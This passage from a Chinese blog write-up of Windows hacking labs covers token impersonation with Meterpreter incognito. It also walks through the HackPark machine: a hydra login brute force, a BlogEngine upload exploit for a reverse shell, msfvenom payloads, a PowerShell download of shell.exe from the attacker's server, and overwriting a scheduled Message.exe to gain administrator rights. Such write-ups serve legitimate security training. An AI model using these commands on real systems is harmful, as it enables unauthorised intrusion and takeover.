<li>模拟令牌(impersonation tokens)：此类令牌能够允许特定进程（或进程中的线程）使用另一个（用户/客户端）进程的令牌来访问相关的资源。</li>
</ul>
<p>对于模拟令牌，有不同的级别：</p>
<ul>
<li>SecurityAnonymous：当前 用户/客户端 不能模拟另一个 用户/客户端。</li>
<li>SecurityIdentification：当前 用户/客户端 可以获得客户端的身份和权限，但不能模拟客户端。</li>
<li>SecurityImpersonation：当前 用户/客户端 可以在本地系统上模拟客户端的安全上下文。</li>
<li>SecurityDelegation：当前 用户/客户端 可以在远程系统上模拟客户端的安全上下文。</li>
</ul>
<p>tips：这里的安全上下文是指一个包含用户相关安全信息的数据结构。</p>
<p>账户所具有的权限（在账户创建时授予账户的权限或者从group处继承的权限）能够允许对应用户执行一些特定操作，以下是最常被滥用的特权：</p>
<ul>
<li>SeImpersonatePrivilege</li>
<li>SeAssignPrimaryPrivilege</li>
<li>SeTcbPrivilege</li>
<li>SeBackupPrivilege</li>
<li>SeRestorePrivilege</li>
<li>SeCreateTokenPrivilege</li>
<li>SeLoadDriverPrivilege</li>
<li>SeTakeOwnershipPrivilege</li>
<li>SeDebugPrivilege</li>
</ul>
<p>更多关于令牌特权滥用的信息请参考：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a></p>
<p>输入whoami /priv查看当前用户所有权限</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839647.png" alt="image-20240406110447285"></p>
<p>可以看到目标机启用了两个关键权限（SeDebugPrivilege、SeImpersonatePrivilege），这两个权限能够让我们使用MSF中的模块来进行令牌模拟操作</p>
<p>接着在meterpreter shell中load incognito</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839648.png" alt="image-20240406110619956"></p>
<p>模块加载完成之后 输入<code>list_tokens -g</code>命令检查哪些令牌可用，我们发现<code>BUILTIN\Administrators</code>令牌可用，所以我们可以模拟管理员令牌，模拟完成后，再运行<code>getuid</code>命令，可以看到此时我们的uid已经变更为SYSTEM的uid，说明模拟令牌成功。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839649.png" alt="image-20240406110822892"></p>
<p>即使我们现在拥有更高特权的令牌（token ），我们实际上也可能没有对应的特权用户的权限（由于 Windows 处理权限的方式 - Windows会使用主令牌而不是模拟令牌来确定某个进程的权限分配情况）；所以我们还需要迁移到具有正确权限的进程，我们可以选择迁移到最安全的services.exe进程，首先使用ps命令查看所有进程，找到services.exe进程的PID，然后使用<code>migrate PID-OF-PROCESS</code>迁移到目标进程，具体命令如下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839650.png" alt="image-20240406110957645"></p>
<pre><code class="hljs scss">getpid #查看当前进程pid
ps #查看所有的进程
migrate <span class="hljs-number">668</span> #迁移到services<span class="hljs-selector-class">.exe</span>进程 需指定目标进程的PID号</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839651.png" alt="image-20240406111038153"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839652.png" alt="image-20240406111115419"></p>
<h2 id="总结">总结</h2>
<p>依旧是利用靶机的web站点缺点，对方含有jenkins组件，该组件的版本恰好存在漏洞，利用其中的某个功能能够执行命令，接着利用其执行了powershell的反弹shell脚本，nc监听拿到shell，之后为了稳定+方便，要切换到meterpreter shell，思路是msfvenom生成meterpreter reverse_shell上传到靶机之后，运行（在本地开了msf监听模块）之后成功拿到shell，之后利用模仿令牌来提权，load incognito看到对方可以模仿的令牌之后，利用命令成功模仿，但我们当前是模仿令牌但不是主令牌，因此需要migrate迁移到正确权限的程序，之后就成功提权（这里我没有尝试直接迁移会如何，下次得记着）。</p>
<h1 id="0x06-hackpark挑战">0x06 HackPark挑战</h1>
<p>连接到我们的网络并部署这台机器。请耐心等待，因为这台机器最多可能需要 5 分钟才能启动！您可以通过访问我们的访问页面来测试您是否连接到我们的网络。请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。</p>
<p>本会议室将介绍暴力破解帐户凭据、处理公共漏洞、使用 Metasploit 框架和 Windows 上的权限升级。</p>
<h2 id="hydra暴力破解">hydra暴力破解</h2>
<p>Hydra 是一种并行化、快速且灵活的登录破解工具。</p>
<p>暴力破解会尝试使用多种密码组合进行登录。 字典攻击也是一种暴力破解，我们可以通过字典内容迭代来获取正确的密码组合。</p>
<p>我们需要找到一个登录页面来攻击并确定表单向网络服务器发出的请求类型。通常，Web 服务器发出两种类型的请求，一种是用于从 Web 服务器请求数据的 GET 请求，另一种是用于向服务器发送数据的 POST 请求。</p>
<p>您可以通过右键单击登录表单，检查元素，然后读取方法字段中的值来检查表单发出的请求。如果您通过 BurpSuite 拦截流量，您也可以识别这一点（可以在此处找到其他 <a target="_blank" rel="noopener" href="https://www.w3schools.com/tags/ref_httpmethods.asp">HTTP 方法</a>）。</p>
<p>Windows 网站登录表单使用什么请求类型？——POST类型</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839653.png" alt="image-20240406112916602"></p>
<p>现在我们知道请求类型和登录表单的 URL，我们可以使用hydra对登陆框进行暴力破解。</p>
<p>我们将填充并使用以下命令：</p>
<pre><code class="hljs scss">hydra -l &lt;username&gt; -<span class="hljs-selector-tag">P</span> /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-<span class="hljs-selector-tag">form</span> &lt;login request pattern&gt;

#关于http-post-<span class="hljs-selector-tag">form</span>："&lt;path to login <span class="hljs-selector-tag">form</span>&gt;:&lt;body, with magic strings ^USER^ and ^PASS^&gt;:&lt;pattern that appears in an invalid login&gt;<span class="hljs-string">"</span></code></pre>
<p>需要填充的字段有：用户名（admin）和IP(靶机IP)以及字典（rockyou.txt），在http-post-from后加上网站登陆页的URL以及POST请求所对应的表单数据（表单数据可通过Burp抓取或者在浏览器端直接查看），其中用户名和密码要修改格式（USER和PASS），最后再加上登录错误时的提示语句“Login failed”（将浏览器语言设置为英文）。</p>
<p>具体命令如下：</p>
<pre><code class="hljs scss">hydra -l admin -<span class="hljs-selector-tag">P</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.9</span><span class="hljs-selector-class">.70</span> http-post-<span class="hljs-selector-tag">form</span> "/Account/login<span class="hljs-selector-class">.aspx</span>:__VIEWSTATE=A79cd%<span class="hljs-number">2</span>Fd56MBqXHayonGgo9MFuFbQU6QPgXzIC%<span class="hljs-number">2</span>B9FMhzTK7iMPj4zufjKqn3GNZWqtmDPLnM3RtK7TkB%<span class="hljs-number">2</span>BYvlEkWuMDAJirSykwjQ%<span class="hljs-number">2</span>FxVGWAv5Cyji4ywzRTSm9iL8I8dMNvvhWDbZe6qWUFX%<span class="hljs-number">2</span>FEOOnmbrp1mU4IPOxzJGSnYTY2CNw6wYAJHPUHh%<span class="hljs-number">2</span>FB388uvKDteVckgTZtgt66yI8xd5etFdURzNBbnCs4dJswVuPShvKWGKbJUyHFJ5jadz4XvkArprAEcDAd9Ll%<span class="hljs-number">2</span>F5zkDvEiLHoGYMwRJLCQj05O1NF7MYjsnmc0WKGMfbhqXmWkGAwpvRJolCxYkjmJfsevJUigud7%<span class="hljs-number">2</span>BppQIWb%<span class="hljs-number">2</span>BVcVi00Eo8qr1RtOJ%<span class="hljs-number">2</span>FKB&amp;__EVENTVALIDATION=QRBLSmDgKfpCrfL79eVdKup%<span class="hljs-number">2</span>FRJ91Bmhgi7SgxOupvZnLmSVshmyDfmOIr%<span class="hljs-number">2</span>BKc%<span class="hljs-number">2</span>FyeXqYKrM4YA%<span class="hljs-number">2</span>FHCfDF3SfBc%<span class="hljs-number">2</span>BT1Wpxa9ownCMxyjUQ5Y3drEvWm11h2mdfvuiMXcRGqkQ7Li8bDSDDgR13qwydwbPI6xcL1ciNTevksX%<span class="hljs-number">2</span>BsVcHfSVf8W1w&amp;ctl00%<span class="hljs-number">24</span>MainContent%<span class="hljs-number">24</span>LoginUser%<span class="hljs-number">24</span>UserName=^USER^&amp;ctl00%<span class="hljs-number">24</span>MainContent%<span class="hljs-number">24</span>LoginUser%<span class="hljs-number">24</span>Password=^PASS^&amp;ctl00%<span class="hljs-number">24</span>MainContent%<span class="hljs-number">24</span>LoginUser%<span class="hljs-number">24</span>LoginButton=Log+in:Login failed<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839654.png" alt="image-20240406114001866"></p>
<p>这里需要将浏览器语言设置为英文，还需要配置登陆失败提示语（页面回显发现的）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839655.png" alt="image-20240406114850137"></p>
<p>Hydra 有很多功能，并且有许多可用的“模块”（我们刚才使用的 http-post-form就是模块的一种），此工具不仅适用于暴力破解 HTTP 表单，还适用于破解其他计算机协议相关的登陆密码，例如 FTP、SSH、SMTP、SMB 等协议。</p>
<p>下面是一个关于Hydra的迷你备忘单：</p>
<pre><code class="hljs scss">命令                                                                                  说明
hydra -<span class="hljs-selector-tag">P</span> &lt;wordlist&gt; -v &lt;ip&gt; &lt;protocol&gt;                                        针对某一协议进行暴力破解操作

hydra -v -V -u -L &lt;username list&gt; -<span class="hljs-selector-tag">P</span> &lt;password list&gt; -t <span class="hljs-number">1</span> -u &lt;ip&gt; &lt;protocol&gt;  使用Hydra来暴力破解用户名和密码（-vV：表示使用详细模式）。

hydra -t <span class="hljs-number">1</span> -V -f -l &lt;username&gt; -<span class="hljs-selector-tag">P</span> &lt;wordlist&gt; rdp://&lt;ip&gt;                       使用密码字典以攻击Windows远程桌面主机。

hydra -l &lt;username&gt; -P &lt;password list&gt; <span class="hljs-variable">$ip</span> -V http-form-post <span class="hljs-string">'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</span>                       为Hydra提供更具体的信息以进行暴力破解操作。</code></pre>
<h2 id="获取目标web应用程序的初始shell">获取目标web应用程序的初始shell</h2>
<p>识别并执行一个公共漏洞利用脚本（来自 <a target="_blank" rel="noopener" href="http://exploit-db.com">exploit-db.com</a>）以在目标Windows机器上获得初始访问权限！</p>
<p>Exploit-Database 是一个 CVE（常见漏洞和泄露）存档库，该库用于保存一些公开漏洞exp和相应的易受攻击的软件信息，以便于渗透测试人员使用和开展漏洞研究。Exploit-Database 由 Offensive Security组织所维护（该组织同时也负责OSCP和Kali）。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839656.png" alt="image-20240406115421648"></p>
<p>登录进去之后发现该网站所使用的框架，上exploit搜索相关漏洞</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839657.png" alt="image-20240406115711049"></p>
<p>搜到之后，跟着目录描述一步步拿到shell</p>
<pre><code class="hljs scss">First, we set the TcpClient <span class="hljs-selector-tag">address</span> and port within the method below to 
 * our attack host, who has <span class="hljs-selector-tag">a</span> reverse tcp listener waiting for <span class="hljs-selector-tag">a</span> connection.
 * Next, we upload this file through the file manager.  In the current (<span class="hljs-number">3.3</span>.<span class="hljs-number">6</span>)
 * version of BlogEngine, this is done by editing <span class="hljs-selector-tag">a</span> post and clicking on the 
 * <span class="hljs-attribute">icon</span> that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView<span class="hljs-selector-class">.ascx</span>. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:</code></pre>
<p>简单说就是现在exp文件修改监听端口和IP，接着在如下图所示的地方上传文件，注意文件名必须是PostView.ascx</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839658.png" alt="image-20240406122243917"></p>
<p>之后访问指定目录：<code>http://IP/?theme=../../App_Data/files</code>即可拿到shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839659.png" alt="image-20240406122138295"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839660.png" alt="image-20240406122358633"></p>
<h2 id="权限提升">权限提升</h2>
<p>在此任务中，我们将了解 Windows 权限提升的基础知识。</p>
<p>首先，我们将从 netcat 转向 meterpreter 会话，并使用它来枚举机器以识别潜在的漏洞。然后，我们将使用收集到的信息来利用该系统并成为管理员。</p>
<p>上一小节建立的netcat 会话有点不稳定，我们可以使用 msfvenom 来建立一个新的反向shell。我们可以将普通shell升级为 meterpreter会话，此处需要使用 metasploit 来设置一个监听器。</p>
<p>首先，启动一个终端，运行metasploit并启动一个监听器。——老生常谈了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839661.png" alt="image-20240406122725814"></p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> LPORT=<span class="hljs-number">5555</span> -e x86/shikata_ga_nai -f exe -o shell<span class="hljs-selector-class">.exe</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839662.png" alt="image-20240406123016084"></p>
<p>接着开启http服务，上传文件到目标机上</p>
<p>使用上一小节中所建立的shell界面拉取本地机中的exe文件到目标机上并执行该exe文件。</p>
<p>tips：</p>
<ul>
<li>我们通常会发现目标系统的C:\Windows\Temp是全局可写的！我们可以利用这一点在目标机上操作–拉取本地机中的文件到目标系统上并尝试执行这些文件。</li>
<li>例子（前提是在本地机启动http服务器）：powershell -c “Invoke-WebRequest -Uri ‘ip/shell.exe’ -OutFile ‘C:\Windows\Temp\shell.exe’”</li>
<li>使用 .\filename.exe 在目标机上执行这些文件。</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839663.png" alt="image-20240406123155367"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839664.png" alt="image-20240406123151741"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839665.png" alt="image-20240406123254699"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839666.png" alt="image-20240406123302658"></p>
<p>sysinfo查看目标系统版本信息</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839667.png" alt="image-20240406123439307"></p>
<p>在此处：我们可以使用一个名为 WinPEAS 的工具。 WinPEAS 是一个脚本，它可以在 Windows 机器上找到可能会被攻击者利用的路径和服务。</p>
<p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe</a></p>
<p>上传WinPEAS脚本文件到目标机（方法和之前类似，此处使用第三小节中建立的的普通shell界面进行上传，也可以使用刚才建立的meterpreter 会话进行上传）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839668.png" alt="image-20240406124047059"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839669.png" alt="image-20240406124340761"></p>
<p>异常服务就是上述的红色框中的，这里是看不出来运行的exe文件的，还需要进入systemscheduler目录下看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839670.png" alt="image-20240406124846406"></p>
<p>如上图看到了众多的exe文件，但我们要找的是该服务会去运行的程序，因此需要进入Events事件查看器看一下该服务的运行日志</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839671.png" alt="image-20240406124946192"></p>
<p>可以看到运行的程序文件为Message.exe，接下来就是使用该程序提升权限</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> LPORT=<span class="hljs-number">5555</span> -e x86/shikata_ga_nai -f exe -o Message<span class="hljs-selector-class">.exe</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839672.png" alt="image-20240406125323425"></p>
<pre><code class="hljs scss">copy Message<span class="hljs-selector-class">.exe</span> "C:\Program Files (x86)\SystemScheduler\Message.exe<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839673.png" alt="image-20240406125819238"></p>
<p>这样便成功覆盖上述正常exe文件，之后直接run运行监听模块即可，因为该服务会持续运行Message.exe</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839674.png" alt="image-20240406125936613"></p>
<p>发现成功为管理员身份</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839675.png" alt="image-20240406130040591"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839676.png" alt="image-20240406130212894"></p>
